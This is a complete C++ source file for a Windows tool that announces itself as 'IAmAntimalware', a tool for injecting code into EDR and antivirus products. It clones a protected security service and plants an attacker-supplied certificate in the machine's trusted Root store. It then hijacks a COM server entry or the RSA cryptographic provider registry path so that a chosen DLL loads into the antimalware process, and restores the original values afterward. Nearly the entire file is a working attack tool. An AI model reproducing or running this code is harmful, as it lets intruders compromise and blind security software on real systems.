#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winsvc.h>
#include <sddl.h>
#include <string>
#include <iostream>
#include <wincrypt.h>
#include <vector>
#include <fstream>
#include "ProcessMisc.h"

#pragma comment(lib, "Crypt32.lib")

bool SetRegistryImagePath(std::wstring subKey, const std::wstring imagePath)
{
    HKEY hKey;
    // Open the registry key with write access
    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        std::wcerr << L"Failed to open registry key. Error code: " << result << std::endl;
        return false;
    }
    // Set the value
    result = RegSetValueExW(
        hKey,
        L"Image Path",            // Value name
        0,
        REG_SZ,                   // Type: string
        reinterpret_cast<const BYTE*>(imagePath.c_str()),
        static_cast<DWORD>((imagePath.size() + 1) * sizeof(wchar_t)) // Size in bytes
    );
    RegCloseKey(hKey);
    if (result != ERROR_SUCCESS)
    {
        std::wcerr << L"Failed to set registry value. Error code: " << result << std::endl;
        return false;
    }
    std::wcout << L"Regisrty value " << imagePath << L" set successfully." << std::endl;
    return true;
}

bool ImportCloneCertificate(const std::wstring certFilePath)
{
    std::vector<BYTE> certData;
    std::ifstream file(certFilePath, std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        std::wcerr << L"Error: Cannot open file. Code = " << GetLastError() << std::endl;
        return false;
    }
    std::streamsize size = file.tellg();
    if (size <= 0)
    {
        std::wcerr << L"Error: Invalid file size. Code = " << GetLastError() << std::endl;
        return false;
    }
    file.seekg(0, std::ios::beg);
    certData.resize(static_cast<size_t>(size));
    if (!file.read(reinterpret_cast<char*>(certData.data()), size))
    {
        std::wcerr << L"Error: Failed to read file. Code = " << GetLastError() << std::endl;
        return false;
    }
    PCCERT_CONTEXT pCertContext = CertCreateCertificateContext(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, certData.data(), static_cast<DWORD>(certData.size()));
    if (!pCertContext)
    {
        std::wcerr << L"Error: Failed to create certificate context. Code = " << GetLastError() << std::endl;
        return false;
    }
    HCERTSTORE hStore = CertOpenStore(CERT_STORE_PROV_SYSTEM_W, 0, NULL, CERT_SYSTEM_STORE_LOCAL_MACHINE, L"Root"); //CERT_SYSTEM_STORE_LOCAL_MACHINE L"Root"
    if (!hStore)
    {
        std::wcerr << L"Error: Failed to open certificate store. Code = " << GetLastError() << std::endl;
        CertFreeCertificateContext(pCertContext);
        return false;
    }
    if (!CertAddCertificateContextToStore(hStore, pCertContext, CERT_STORE_ADD_REPLACE_EXISTING, NULL))
    {
        std::wcerr << L"Error: Failed to add certificate to store. Code = " << GetLastError() << std::endl;
        CertCloseStore(hStore, 0);
        CertFreeCertificateContext(pCertContext);
        return false;
    }
    CertCloseStore(hStore, 0);
    CertFreeCertificateContext(pCertContext);
    std::wcout << L"Cert " << certFilePath << L" import successfully." << std::endl;
    return true;
}

bool CloneService(const std::wstring serviceName, std::wstring newServiceName, BOOL protectCheck)
{
    std::wstring sourceKeyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, sourceKeyPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
    {
        std::wcerr << L"Failed to open registry key for " << serviceName << L": " << GetLastError() << std::endl;
        return false;
    }
    DWORD dwType = 0;
    DWORD dwSize = sizeof(DWORD);
    DWORD launchProtected = 0;
    DWORD type = 0;
    wchar_t imagePath[MAX_PATH] = { 0 };
    DWORD imagePathSize = sizeof(imagePath);
    RegQueryValueExW(hKey, L"ImagePath", nullptr, nullptr, (LPBYTE)imagePath, &imagePathSize);
    RegQueryValueExW(hKey, L"Type", nullptr, &dwType, reinterpret_cast<LPBYTE>(&type), &dwSize);

    wchar_t objectName[256] = { 0 };
    DWORD objectNameSize = sizeof(objectName);
    RegQueryValueExW(hKey, L"ObjectName", nullptr, nullptr, (LPBYTE)objectName, &objectNameSize);

    DWORD sidType = 0;
    RegQueryValueExW(hKey, L"ServiceSidType", nullptr, &dwType, reinterpret_cast<LPBYTE>(&sidType), &dwSize);

    wchar_t description[1024] = { 0 };
    DWORD descSize = sizeof(description);
    RegQueryValueExW(hKey, L"Description", nullptr, nullptr, (LPBYTE)description, &descSize);

    RegQueryValueExW(hKey, L"LaunchProtected", nullptr, &dwType, reinterpret_cast<LPBYTE>(&launchProtected), &dwSize);

    RegCloseKey(hKey);

    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager)
    {
        std::wcerr << L"OpenSCManagerW failed" << L": " << GetLastError() << std::endl;
        return false;
    }
    SC_HANDLE hService = CreateServiceW(
        hSCManager,
        newServiceName.c_str(),
        newServiceName.c_str(),
        SERVICE_ALL_ACCESS,
        type ? type : SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, // Default value since we're not cloning ErrorControl
        imagePath,
        nullptr, nullptr, nullptr, nullptr,
        objectName[0] ? objectName : nullptr);

    if (!hService)
    {
        std::wcerr << L"CreateServiceW failed" << L": " << GetLastError() << std::endl;
        CloseServiceHandle(hSCManager);
        return false;
    }

    if (description[0])
    {
        SERVICE_DESCRIPTIONW sd = { description };
        ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
    }
    if (sidType)
    {
        SERVICE_SID_INFO sidInfo = { sidType };
        ChangeServiceConfig2W(hService, SERVICE_CONFIG_SERVICE_SID_INFO, &sidInfo);
    }
    if (launchProtected != 0 && protectCheck)
    {
        std::wcout << L"Service " << serviceName << L" was protected. Set protection level: " << launchProtected << std::endl;
        SERVICE_LAUNCH_PROTECTED_INFO info;
        info.dwLaunchProtected = launchProtected;
        ChangeServiceConfig2W(hService, SERVICE_CONFIG_LAUNCH_PROTECTED, &info);
    }
    std::wcout << L"Service " << newServiceName << L" created successfully." << std::endl;

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

bool StartServiceByName(const std::wstring serviceName)
{
    // Open a handle to the Service Control Manager
    SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCManager)
    {
        std::wcerr << L"Failed to open SCManager. Error: " << GetLastError() << std::endl;
        return false;
    }
    // Open the service
    SC_HANDLE hService = OpenService(hSCManager, serviceName.c_str(), SERVICE_START);
    if (!hService) {
        std::wcerr << L"Failed to open service '" << serviceName << L"'. Error: " << GetLastError() << std::endl;
        CloseServiceHandle(hSCManager);
        return false;
    }
    // Start the service
    if (!StartService(hService, 0, nullptr))
    {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            std::wcout << L"Service '" << serviceName << L"' is already running." << std::endl;
        }
        else
        {
            std::wcerr << L"Failed to start service '" << serviceName << L"'. Error: " << err << std::endl;
        }
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }
    std::wcout << L"Service " << serviceName << L" started successfully." << std::endl;

    // Clean up
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

int wmain(int argc, wchar_t* argv[])
{
    std::wcout << L"\nIAmAntimalware: Tool for injecting code into EDR/Antivirus\n"
        << L"\n  Two Seven One Three: https://x.com/TwoSevenOneT\n"
               << L"\n==========================================================\n\n";

    if (argc != 5 && argc != 6)
    {
        std::wcerr << L"Usage:\n\tIAmAntimalware.exe <originalSVName> <newSVName> <certPath> <dllPath>\n";
        std::wcerr << L"\tIAmAntimalware.exe <originalSVName> <newSVName> <certPath> <dllPath> <P>\n";
        std::wcerr << L"\tIAmAntimalware.exe <originalSVName> <newSVName> <certPath> <dllPath> <CLSID>\n";
        return 1;
    }

    std::wstring originalSVName = argv[1];
    std::wstring newSVName = argv[2];
    std::wstring certPath = argv[3];
    std::wstring dllPath = argv[4];
    BOOL launchProtectedCheck = FALSE;
    BOOL comHijack = FALSE;
    std::wstring target = L"P";
    std::wstring comCLSID;
    if (argc == 6 && target == argv[5])
    {
        std::wcout << L"Will set LaunchProtected if support" << std::endl;
        launchProtectedCheck = TRUE;
    }
    else if (argc == 6)
    {
        std::wcout << L"Warning: Will do COM hijack. Must runas TrustedInstaller" << std::endl;
        comHijack = TRUE;
        comCLSID = argv[5];
    }
    bool tmp = FALSE;
    tmp = CloneService(originalSVName, newSVName, launchProtectedCheck);
    if (!tmp)
    {
        return 1;
    }
    //tmp = DeleteServiceByName(L"WinDefend01");
    tmp = ImportCloneCertificate(certPath);
    if (!tmp)
    {
        return 1;
    }
    if (comHijack)
    {
        std::wstring wstrTMP = ReadRegistryDefaultValue(comCLSID);
        tmp = SetDefaultInprocServer32(comCLSID, dllPath);
        if (tmp)
        {
            tmp = StartServiceByName(newSVName);
            Sleep(2000);//must wait to service complete run
            tmp = SetDefaultInprocServer32(comCLSID, wstrTMP);
        }
    }
    else
    {
        bool tmp02 = SetRegistryImagePath(L"SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider", dllPath);
        tmp = SetRegistryImagePath(L"SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider", dllPath);
        if (!tmp)
        {
            if (tmp02)
            {
                SetRegistryImagePath(L"SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider", L"%SystemRoot%\\system32\\rsaenh.dll");
            }
            return 1;
        }
        else
        {
            tmp = StartServiceByName(newSVName);
            Sleep(2000);//must wait to service complete run
            //restore to original rsaenh value
            tmp = SetRegistryImagePath(L"SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider", L"%SystemRoot%\\system32\\rsaenh.dll");
            SetRegistryImagePath(L"SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider", L"%SystemRoot%\\system32\\rsaenh.dll");
        }
    }
    return 0;
}

